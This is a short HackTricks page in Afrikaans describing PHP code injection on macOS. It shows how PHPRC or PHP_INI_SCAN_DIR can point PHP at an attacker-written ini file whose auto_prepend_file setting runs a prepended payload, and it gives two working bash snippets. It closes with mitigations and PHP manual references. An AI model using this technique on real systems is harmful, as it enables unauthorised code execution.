# macOS PHP Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PHPRC` / `PHP_INI_SCAN_DIR` en `auto_prepend_file`

PHP CLI en CGI lees konfigurasie met elke aanroep. `PHPRC` kan ’n aanvaller-leesbare `php.ini` kies, terwyl `PHP_INI_SCAN_DIR` die gids waarna vir bykomende `.ini`-lêers gesoek word, kan herlei. Die `auto_prepend_file`-direktief laat PHP ’n lêer ontleed voordat die aangevraagde skrip uitgevoer word, sodat hierdie kombinasie kode-uitvoering tydens opstart moontlik maak.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```
'n Alternatief is 'n gids wat 'n `.ini`-lêer bevat:
```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```
Die `-n`-opsie ignoreer `php.ini`; ’n eksplisiete vertroude `-c`-pad kry voorkeur bo `PHPRC`. Onthou dat ’n langlewende bediener-SAPI gewoonlik konfigurasie lees wanneer die webbediener begin, terwyl CLI en CGI dit per aanroep doen.<sup>[[1]](#references)</sup>

## References

- [1] [PHP-konfigurasielêer](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
{{#include ../../../banners/hacktricks-training.md}}
